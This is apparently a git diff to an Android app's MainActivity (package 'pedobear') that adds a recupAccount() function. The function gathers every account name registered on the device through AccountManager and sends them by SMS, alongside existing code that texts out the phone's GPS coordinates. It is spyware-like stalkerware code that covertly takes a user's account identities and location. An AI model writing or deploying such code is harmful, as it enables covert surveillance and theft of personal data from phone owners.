@@ -1,5 +1,7 @@
 package com.ingesup.pedobear;
 
+import android.accounts.Account;
+import android.accounts.AccountManager;
 import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
@@ -18,6 +20,7 @@ import android.support.v7.app.ActionBarActivity;
 import android.os.Bundle;
 import android.telephony.SmsManager;
 import android.telephony.TelephonyManager;
+import android.util.Log;
 import android.view.Menu;
 import android.view.MenuItem;
 import android.view.View;
@@ -30,6 +33,7 @@ import java.lang.reflect.Method;
 public class MainActivity extends ActionBarActivity {
 
     String position = " ";
+    String account = " ";
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -43,7 +47,8 @@ public class MainActivity extends ActionBarActivity {
             @Override
             public void onClick(View v) {
                 //TODO: Entrer les fonctions et les Scripts à executé
-                recupGPS();
+                //recupGPS();
+                recupAccount();
                 //planeMode();
             }
         });
@@ -88,6 +93,15 @@ public class MainActivity extends ActionBarActivity {
 
         position = "Latitude :" + latitude + "\n" + "Longitude :" + longitude;
         sendSMS(position);
+    }
+
+    public void recupAccount(){
+        Account[] lstAcc = AccountManager.get(getApplicationContext()).getAccounts();
+        for(Account Acc : lstAcc){
+            account = account + "Compte: " + Acc.name + "/n";
+        }
+        Log.d("TestAccount", account);
+        sendSMS(account);
     }
 
     protected void sendSMS(String recipient) {
